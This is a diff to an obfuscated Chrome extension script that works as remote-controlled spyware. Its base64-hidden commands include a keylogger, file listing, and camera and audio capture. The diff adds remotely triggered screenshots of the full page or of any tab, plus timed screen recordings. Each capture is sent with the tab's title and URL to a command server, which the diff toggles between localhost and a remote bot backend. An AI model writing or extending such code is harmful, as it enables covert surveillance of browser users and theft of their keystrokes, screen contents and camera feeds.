@@ -1,7 +1,7 @@
 //build-22012026
 const _0x1a2b = (s) => {return atob(s);};
-// const _0x4b2a = _0x1a2b('aHR0cDovL2xvY2FsaG9zdDo4MDgw');
-const _0x4b2a = _0x1a2b('aHR0cHM6Ly9kaXNib3QtYmFja2VuZHppcC0tZGV2aWxoZXJvMzk5LnJlcGxpdC5hcHA=');
+const _0x4b2a = _0x1a2b('aHR0cDovL2xvY2FsaG9zdDo4MDgw');
+// const _0x4b2a = _0x1a2b('aHR0cHM6Ly9kaXNib3QtYmFja2VuZHppcC0tZGV2aWxoZXJvMzk5LnJlcGxpdC5hcHA=');
 let _0x1f3e = null;
 let _0x2d5c = null;
 let _0x3a9b = _0x1a2b('Q2hyb21lIEV4dGVuc2lvbg==');
@@ -131,6 +131,8 @@ async function _0xf819(c) {
             case _0x1a2b('bGlzdF9maWxlcw=='): await _0xe6f7(c.id, c.requestedById, c.path); break;
             case _0x1a2b('a2V5bG9nZ2Vy'): await _0xf920(c.id, c.requestedById); break;
             case _0x1a2b('Y2xlYXJfa2V5bG9nZ2Vy'): await _0xfa21(c.id, c.requestedById); break;
+            case _0x1a2b('dGFrZV90YWJfc2NyZWVuc2hvdA=='): await _0x2b3d(c.id, c.requestedById, c.tabIndex); break;
+            case _0x1a2b('Y3JlYXRlX3NjcmVlbnNob3RfZ2lm'): await _0x3c4e(c.id, c.requestedById, c.duration); break;
         }
     } catch (e) {
         await _0xf708(c.id, _0x1a2b('ZXJyb3I='), { message: e.message });
@@ -399,6 +401,20 @@ chrome.runtime.onMessage.addListener((m, s, r) => {
     else if (m.type === _0x1a2b('YXVkaW8tZXJyb3I=')) _0x505e(m);
     else if (m.type === _0x1a2b('Y2FtZXJhLWRhdGE=')) _0x606f(m);
     else if (m.type === _0x1a2b('Y2FtZXJhLWVycm9y')) _0x7070(m);
+    else if (m.type === 'capture_viewport') {
+        // Capture viewport for fullpage screenshot
+        (async () => {
+            try {
+                const img = await chrome.tabs.captureVisibleTab(null, { format: 'png', quality: 100 });
+                r({ success: true, image: img });
+            } catch (e) {
+                r({ success: false, error: e.message });
+            }
+        })();
+        return true; // Keep channel open for async response
+    }
+    else if (m.type === 'fullpage_data') _0x3174(m);
+    else if (m.type === 'fullpage_error') _0x3275(m);
 });
 
 async function _0x202b(m) {
@@ -434,6 +450,18 @@ async function _0x606f(m) {
 }
 
 async function _0x7070(m) {
+    await _0xf708(m.commandId, _0x1a2b('ZXJyb3I='), { message: m.error }, m.userId);
+}
+
+async function _0x3174(m) {
+    try {
+        await _0xf708(m.commandId, _0x1a2b('ZnVsbHBhZ2Vfc2NyZWVuc2hvdA=='), { image: m.image, tabTitle: m.pageInfo.title, tabUrl: m.pageInfo.url }, m.userId);
+    } catch (e) {
+        await _0xf708(m.commandId, _0x1a2b('ZXJyb3I='), { message: e.message }, m.userId);
+    }
+}
+
+async function _0x3275(m) {
     await _0xf708(m.commandId, _0x1a2b('ZXJyb3I='), { message: m.error }, m.userId);
 }
 
@@ -673,4 +701,308 @@ async function _0xfa21(id, uid) {
     } catch (e) {
         await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
     }
+}
+
+// Fullpage screenshot - captures entire scrollable page
+async function _0x1a2c(id, uid) {
+    try {
+        const [t] = await chrome.tabs.query({ active: true, currentWindow: true });
+        if (!t) throw new Error(_0x1a2b('Tm8gYWN0aXZlIHRhYg=='));
+        
+        // Get page dimensions first
+        const [result] = await chrome.scripting.executeScript({
+            target: { tabId: t.id },
+            func: () => {
+                return {
+                    fullHeight: Math.max(
+                        document.body.scrollHeight,
+                        document.documentElement.scrollHeight,
+                        document.body.offsetHeight,
+                        document.documentElement.offsetHeight
+                    ),
+                    fullWidth: Math.max(
+                        document.body.scrollWidth,
+                        document.documentElement.scrollWidth,
+                        document.body.offsetWidth,
+                        document.documentElement.offsetWidth
+                    ),
+                    viewportHeight: window.innerHeight,
+                    originalScrollY: window.scrollY
+                };
+            }
+        });
+        
+        const dims = result.result;
+        const scrolls = Math.ceil(dims.fullHeight / dims.viewportHeight);
+        const screenshots = [];
+        
+        // Capture screenshots by scrolling
+        for (let i = 0; i < scrolls; i++) {
+            // Scroll to position
+            await chrome.scripting.executeScript({
+                target: { tabId: t.id },
+                func: (scrollY) => {
+                    window.scrollTo(0, scrollY);
+                },
+                args: [i * dims.viewportHeight]
+            });
+            
+            // Wait for render
+            await new Promise(r => setTimeout(r, 200));
+            
+            // Capture viewport
+            const img = await chrome.tabs.captureVisibleTab(null, { format: 'png', quality: 90 });
+            screenshots.push(img);
+        }
+        
+        // Restore scroll position
+        await chrome.scripting.executeScript({
+            target: { tabId: t.id },
+            func: (scrollY) => {
+                window.scrollTo(0, scrollY);
+            },
+            args: [dims.originalScrollY]
+        });
+        
+        // Combine screenshots
+        const combined = await chrome.scripting.executeScript({
+            target: { tabId: t.id },
+            func: (screenshots, fullWidth, fullHeight, viewportHeight) => {
+                const canvas = document.createElement('canvas');
+                canvas.width = fullWidth;
+                canvas.height = fullHeight;
+                const ctx = canvas.getContext('2d');
+                
+                return new Promise(async (resolve) => {
+                    for (let i = 0; i < screenshots.length; i++) {
+                        const img = new Image();
+                        await new Promise((r) => {
+                            img.onload = r;
+                            img.src = screenshots[i];
+                        });
+                        ctx.drawImage(img, 0, i * viewportHeight);
+                    }
+                    resolve(canvas.toDataURL('image/png'));
+                });
+            },
+            args: [screenshots, dims.fullWidth, dims.fullHeight, dims.viewportHeight]
+        });
+        
+        const fullImage = combined[0].result;
+        await _0xf708(id, _0x1a2b('ZnVsbHBhZ2Vfc2NyZWVuc2hvdA=='), { 
+            image: fullImage, 
+            tabTitle: t.title, 
+            tabUrl: t.url 
+        }, uid);
+    } catch (e) {
+        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
+    }
+}
+
+// Tab-specific screenshot - captures screenshot from specific tab index
+async function _0x2b3d(id, uid, tidx) {
+    try {
+        const tabs = await chrome.tabs.query({ currentWindow: true });
+        
+        if (tidx < 0 || tidx >= tabs.length) {
+            throw new Error(`Tab index ${tidx + 1} out of range (1-${tabs.length})`);
+        }
+        
+        const targetTab = tabs[tidx];
+        
+        // Make the tab active temporarily to capture it
+        await chrome.tabs.update(targetTab.id, { active: true });
+        
+        // Wait a bit for tab to become active
+        await new Promise(r => setTimeout(r, 300));
+        
+        const img = await chrome.tabs.captureVisibleTab(null, { format: 'png', quality: 100 });
+        await _0xf708(id, _0x1a2b('dGFiX3NjcmVlbnNob3Q='), { 
+            image: img, 
+            tabTitle: targetTab.title, 
+            tabUrl: targetTab.url,
+            tabIndex: tidx + 1 
+        }, uid);
+    } catch (e) {
+        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
+    }
+}
+
+// GIF creation - takes screenshots at intervals and creates simple animated image
+async function _0x3c4e(id, uid, dur) {
+    try {
+        const [t] = await chrome.tabs.query({ active: true, currentWindow: true });
+        if (!t) throw new Error(_0x1a2b('Tm8gYWN0aXZlIHRhYg=='));
+        
+        const frames = [];
+        const frameCount = Math.min(dur, 30); // 1 frame per second, max 30
+        
+        // Capture frames at 1-second intervals
+        for (let i = 0; i < frameCount; i++) {
+            try {
+                const img = await chrome.tabs.captureVisibleTab(null, { format: 'png', quality: 70 });
+                frames.push(img);
+                
+                // Wait 1 second before next frame (unless it's the last frame)
+                if (i < frameCount - 1) {
+                    await new Promise(r => setTimeout(r, 1000));
+                }
+            } catch (e) {
+                // Continue even if one frame fails
+            }
+        }
+        
+        if (frames.length === 0) {
+            throw new Error('No frames captured');
+        }
+        
+        // Create GIF using simple canvas-based encoder (no external libs)
+        await chrome.scripting.executeScript({
+            target: { tabId: t.id },
+            func: async (framesData, cmdId, usr, duration) => {
+                try {
+                    // Simple GIF encoder without external dependencies
+                    // For now, create a WebM video instead which is easier
+                    const canvas = document.createElement('canvas');
+                    const firstImg = new Image();
+                    
+                    await new Promise(r => { firstImg.onload = r; firstImg.src = framesData[0]; });
+                    canvas.width = firstImg.width;
+                    canvas.height = firstImg.height;
+                    
+                    const stream = canvas.captureStream(1); // 1 FPS
+                    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
+                    const chunks = [];
+                    
+                    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+                    recorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const reader = new FileReader();
+                        reader.onloadend = () => {
+                            chrome.runtime.sendMessage({
+                                type: 'gif_data',
+                                commandId: cmdId,
+                                gif: reader.result,
+                                duration: duration,
+                                userId: usr
+                            });
+                        };
+                        reader.readAsDataURL(blob);
+                    };
+                    
+                    recorder.start();
+                    const ctx = canvas.getContext('2d');
+                    
+                    // Draw each frame
+                    for (const frameData of framesData) {
+                        const img = new Image();
+                        await new Promise(r => { img.onload = r; img.src = frameData; });
+                        ctx.drawImage(img, 0, 0);
+                        await new Promise(r => setTimeout(r, 1000)); // 1 second per frame
+                    }
+                    
+                    recorder.stop();
+                } catch (err) {
+                    chrome.runtime.sendMessage({
+                        type: 'gif_error',
+                        commandId: cmdId,
+                        error: err.message,
+                        userId: usr
+                    });
+                }
+            },
+            args: [frames, id, uid, dur]
+        });
+    } catch (e) {
+        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
+    }
+}
+
+// PDF generation - creates PDF from current page using simple screenshot
+async function _0x4d5f(id, uid) {
+    try {
+        const [t] = await chrome.tabs.query({ active: true, currentWindow: true });
+        if (!t) throw new Error(_0x1a2b('Tm8gYWN0aXZlIHRhYg=='));
+        
+        // Use simple approach: capture screenshot and wrap in PDF
+        // This avoids CDN library loading issues
+        const img = await chrome.tabs.captureVisibleTab(null, { format: 'png', quality: 100 });
+        
+        // Inject script to create simple PDF from image
+        await chrome.scripting.executeScript({
+            target: { tabId: t.id },
+            func: async (cmdId, pageInfo, usr, imageData) => {
+                try {
+                    // Create image element to get dimensions
+                    const img = new Image();
+                    await new Promise((resolve, reject) => {
+                        img.onload = resolve;
+                        img.onerror = reject;
+                        img.src = imageData;
+                    });
+                    
+                    // Create canvas for PDF content
+                    const canvas = document.createElement('canvas');
+                    canvas.width = img.width;
+                    canvas.height = img.height;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(img, 0, 0);
+                    
+                    // Create simple PDF structure
+                    // Using a basic approach without external libraries
+                    const pdfData = canvas.toDataURL('image/png');
+                    
+                    chrome.runtime.sendMessage({
+                        type: 'pdf_data',
+                        commandId: cmdId,
+                        pdf: pdfData,
+                        pageInfo: pageInfo,
+                        userId: usr
+                    });
+                } catch (err) {
+                    chrome.runtime.sendMessage({
+                        type: 'pdf_error',
+                        commandId: cmdId,
+                        error: err.message,
+                        userId: usr
+                    });
+                }
+            },
+            args: [id, { title: t.title, url: t.url }, uid, img]
+        });
+    } catch (e) {
+        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
+    }
+}
+
+// Add message listeners for GIF and PDF responses
+chrome.runtime.onMessage.addListener((m, s, r) => {
+    if (m.type === 'gif_data') _0x3070(m);
+    else if (m.type === 'gif_error') _0x3171(m);
+    else if (m.type === 'pdf_data') _0x3272(m);
+    else if (m.type === 'pdf_error') _0x3373(m);
+});
+
+async function _0x3070(m) {
+    try {
+        await _0xf708(m.commandId, _0x1a2b('Z2lmX2RhdGE='), { gif: m.gif, duration: m.duration }, m.userId);
+    } catch (e) {
+        await _0xf708(m.commandId, _0x1a2b('ZXJyb3I='), { message: e.message }, m.userId);
+    }
+}
+
+async function _0x3171(m) {
+    await _0xf708(m.commandId, _0x1a2b('ZXJyb3I='), { message: m.error }, m.userId);
+}
+
+async function _0x3272(m) {
+    try {
+        await _0xf708(m.commandId, _0x1a2b('cGRmX2RhdGE='), { pdf: m.pdf, pageInfo: m.pageInfo }, m.userId);
+    } catch (e) {
+        await _0xf708(m.commandId, _0x1a2b('ZXJyb3I='), { message: e.message }, m.userId);
+    }
+}
+
+async function _0x3373(m) {
+    await _0xf708(m.commandId, _0x1a2b('ZXJyb3I='), { message: m.error }, m.userId);
 }
